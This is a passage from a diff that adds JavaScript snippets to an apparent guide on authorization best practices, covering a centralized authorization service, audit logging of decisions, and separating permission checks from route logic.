+// 3. Centralized Authorization
+class AuthorizationService {
+  static async authorize(user, action, resource) {
+    // Single point for all authorization logic
+    const policies = await this.loadPolicies();
+    return this.evaluate(policies, user, action, resource);
+  }
+}
+
+// 4. Audit Authorization Decisions
+async function authorizeWithAudit(user, action, resource) {
+  const decision = await authorize(user, action, resource);
+
+  await auditLog.record({
+    timestamp: new Date(),
+    userId: user.id,
+    action,
+    resource,
+    decision,
+    reason: decision.reason
+  });
+
+  return decision;
+}
+
+// 5. Separate Authorization from Business Logic
+// ❌ Bad
+app.post('/posts/:id/delete', async (req, res) => {
+  const post = await Post.findById(req.params.id);
+  if (req.user.id !== post.ownerId && !req.user.roles.includes('admin')) {
+    return res.status(403).send('Forbidden');
+  }
+  await post.delete();
+});
+
+// ✅ Good
+app.post('/posts/:id/delete',
+  authorize('posts:delete'),
+  async (req, res) => {
+    const post = await Post.findById(req.params.id);
+    await post.delete();
+  }
+);
 ```
 
 ---
